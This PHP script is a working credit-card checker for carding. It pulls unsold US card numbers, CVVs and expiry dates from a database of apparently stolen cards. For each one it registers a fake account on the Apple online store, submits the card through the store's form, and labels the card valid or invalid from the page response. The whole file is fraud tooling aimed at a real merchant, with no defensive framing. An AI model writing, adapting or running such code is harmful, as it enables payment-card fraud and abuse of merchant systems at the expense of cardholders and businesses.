<?php

set_time_limit(0);

include("./../includes/db.php");

$oldtype = "NULL";

$result = mysql_query("SELECT * FROM cards WHERE valid_system='ERROR' and country='United States' and number NOT LIKE '6%' and sold=0 ORDER BY RAND()") or die(mysql_error());

while($row = mysql_fetch_assoc($result))
{
	$ch = curl_init();
	
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); 
	
	$msg = submitFormDetails($row['number'], $row['cvv'], $row['expire']);
	
	$cardid = $row['card_id'];
	
	mysql_query("UPDATE cards SET valid_system='$msg' WHERE card_id='$cardid'") or die(mysql_error());
	
	echo $oldtype . ': ' . $row['number'] . ' = ' . $msg . '<br />';
	flush();
}

function submitFormDetails($cardNumber, $cvv, $expire)
{
	global $ch, $oldtype;
	
	$url = gotoFormURL(); // returns action of the register form
	
	$email = 'drag' . rand(1000, 9999) . rand(1000, 999999) . '@gmail.com';
	$passwd = 'qwerty2123';
	$firstname = "Robert";
	$lastname = "Barker";
	$address1 = "3 the winters";
	$address2 = "apt 2";
	$city = "New York";
	$state = "NY";
	$zip = 10001;
	
	// CARD DETAILS
	/*
	$cardType   = "VISA";
	$cardNumber = "4037840016983304";
	$expMonth   = "2";
	$expYear    = "1";
	$cvv        = "956";
	*/
	
	$expm      = substr($expire, 1, 1);
	$expmm     = substr($expire, 0, 2);
	$expYear   = substr($expire, 3, 1); // 1111
	
	if($expmm == "10")
		$expMonth = "9";
	else if($expmm == "11")
		$expMonth = "10";
	else if($expmm == "12")
		$expMonth = "11";
	else
	{
		$expMonth = $expm - 1;
	}
		
	//echo 'EXPIRE: ' . $expire . ' EXP NEW: ' . $expMonth . ' - ' . $expYear . '<br />';
	//echo $email . ":" . $passwd . "\n";
	//flush();
	
	
	switch($cardNumber[0]) // cc type switch(substr($cardNumber, 0, 1)) // cc type
	{
		case 4:
			$cardType = "VISA";
			break;
		case 5:
			$cardType = "Mastercard";
			break;
		case 6:
			$cardType = "Discover";
			break;
		case 3:
			$cardType = "American Express";
			break;
		default:
			$cardType = "VISA";
			break;
	}
	
	$oldtype = $cardType;
	
	//echo '<br />' . $cardType . '<br /><br />';
	
	$datafields = array( // post fields
		"0.26.9.5.1.1.0.1.13.1.7.2" => $email,
		"0.26.9.5.1.1.0.1.13.1.11.0" => $passwd,
		"0.26.9.5.1.1.0.1.13.1.17.0" => $passwd,
		"0.26.9.5.1.1.0.1.13.1.19.3" => "Mothers name", // secret answer
		"0.26.9.5.1.1.0.1.13.1.19.9" => "Hillary", // secret question
		"0.26.9.5.1.1.0.1.13.1.19.15" => 5,
		"0.26.9.5.1.1.0.1.13.1.19.17" => 5,
		"0.26.9.5.1.1.0.1.17.1.17.1.15.7" => $firstname,
		"0.26.9.5.1.1.0.1.17.1.17.1.15.9" => $lastname,
		"0.26.9.5.1.1.0.1.17.1.17.1.28.1.1.11" => $address1,
		"0.26.9.5.1.1.0.1.17.1.17.1.28.1.1.13" => $address2,
		"billingCityName" => $city,
		"0.26.9.5.1.1.0.1.17.1.17.1.28.1.1.26" => $state,
		"0.26.9.5.1.1.0.1.17.1.17.1.28.1.1.28" => $zip,
		"0.26.9.5.1.1.0.1.17.1.17.1.32.4.1" => "716",
		"0.26.9.5.1.1.0.1.17.1.17.1.32.6" => "7161721",
		"0.26.9.5.1.1.0.1.17.1.17.1.32.10" => "",
		"0.26.9.5.1.1.0.1.17.1.17.1.32.12.1.4.1" => "716",
		"0.26.9.5.1.1.0.1.17.1.17.1.32.12.1.6" => "7167232",
		"shippingMethods" => "Standard Shipping",
		"paymentType" => $cardType,
		"0.26.9.5.1.1.0.1.23.1.0.0.1.41.3.0" => $cardNumber,
		"0.26.9.5.1.1.0.1.23.1.0.0.1.43" => $expMonth,
		"0.26.9.5.1.1.0.1.23.1.0.0.1.45" => $expYear, // must be last digit
		"0.26.9.5.1.1.0.1.23.1.0.0.1.47.1" => $cvv,
		"0.26.9.5.1.1.0.1.27.1.5.3" => "Home",
		"0.26.9.5.1.1.0.1.27.1.7" => "0.26.9.5.1.1.0.1.27.1.7",
		"0.26.9.5.1.1.0.1.5.1.11" => "",
		"0.26.9.5.1.1.0.1.37.15.1" => "",
		"0.26.9.5.1.1.0.1.19.11" => "0.26.9.5.1.1.0.1.19.11",
		"0.26.9.5.1.1.0.1.17.1.19.3.1.32.10" => "",
		"0.26.9.5.1.1.0.1.17.1.19.3.1.32.6" => "",
		"0.26.9.5.1.1.0.1.17.1.19.3.1.32.4.1" => "",
		"0.26.9.5.1.1.0.1.17.1.19.3.1.28.1.1.28" => "",
		"0.26.9.5.1.1.0.1.17.1.19.3.1.28.1.1.26" => "",
		"shippingCityName" => "",
		"0.26.9.5.1.1.0.1.17.1.19.3.1.28.1.1.13" => "",
		"0.26.9.5.1.1.0.1.17.1.19.3.1.28.1.1.11" => "",
		"0.26.9.5.1.1.0.1.17.1.19.3.1.15.9" => "",
		"0.26.9.5.1.1.0.1.17.1.19.3.1.15.7" => "",
		"0.26.9.5.1.1.0.1.37.15.1.x" => rand(2, 8),
		"0.26.9.5.1.1.0.1.37.15.1.y" => rand(2, 8)
	);
	
	curl_setopt($ch, CURLOPT_POST, 1); // set POST data
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $datafields);
	curl_setopt($ch, CURLOPT_REFERER, $url); 
	
	$result = curl_exec($ch);
	
	// DISCOVER CARDS SUPPORT
	if(preg_match("/Welcome to the Apple Store/", $result)) // VALID card!
	{
		return "VALID";	
	}
	else if(preg_match("/(We cannot validate your credit card|requires a valid credit)/", $result)) // invalid
	{
		return "INVALID";		
	}
	
	preg_match("/sh\" content=\"3;url=(.*?)\"/", $result, $match);
	
	sleep(4); // must wait 3 seconds, UPDATE make it 4 and it works better
	
	//echo 'META URL: ' . $match[1] . '<br/>';
	//flush();
	
	curl_setopt($ch, CURLOPT_URL, $match[1]);
	curl_setopt($ch, CURLOPT_HTTPGET, 1);
	
	$result = curl_exec($ch);
	
	if(preg_match("/Welcome to the Apple Store/", $result)) // VALID card!
	{
		return "VALID";	
	}
	else if(preg_match("/(We cannot validate your credit card|requires a valid credit)/", $result)) // invalid
	{
		return "INVALID";		
	}
	else // error
	{	
		//echo strip_tags($result);
		//flush();
		return "ERROR";
		//DEBUG
	}
}

function gotoFormURL()
{	
	global $ch; // Use global cURL handle
	
	curl_setopt($ch, CURLOPT_URL, 'http://store.apple.com/us'); // Define login url
	curl_setopt($ch, CURLOPT_REFERER, 'http://store.apple.com/us'); 
	//curl_setopt($ch, CURLOPT_POSTFIELDS, $data); // Define post data
	
	$result = curl_exec($ch); // goto LOGIN form
	
	preg_match("/<a href=\"(.*?)\" onclick=\".*?\" >1\-Click Settings<\/a>/", $result, $formUrl);
	curl_setopt($ch, CURLOPT_URL, $formUrl[1]);	
	$result = curl_exec($ch); // goto login url
	
	// handles 2 cases for login links
	if(preg_match("/click here to set one up/", $result)) // text link 
	{
		preg_match("/<a href=\"(.*?)\">click here<\/a>/", $result, $matches);
		$newurl = $matches[0];
	}
	else // else its the image register
	{
		preg_match_all("/<a href=\"(.*?)\">/", $result, $matches);
		$newurl = $matches[1][7];
	}
	
	// LOADS REGISTER PAGE
	curl_setopt($ch, CURLOPT_URL, $newurl); // Define login url
	$result = curl_exec($ch);
	
	preg_match("/<form id=\"addressForm\" method=\"POST\" action=\"(.*?)\">/", $result, $newmatch);
	
	return $newmatch[1]; // return form action
}

?>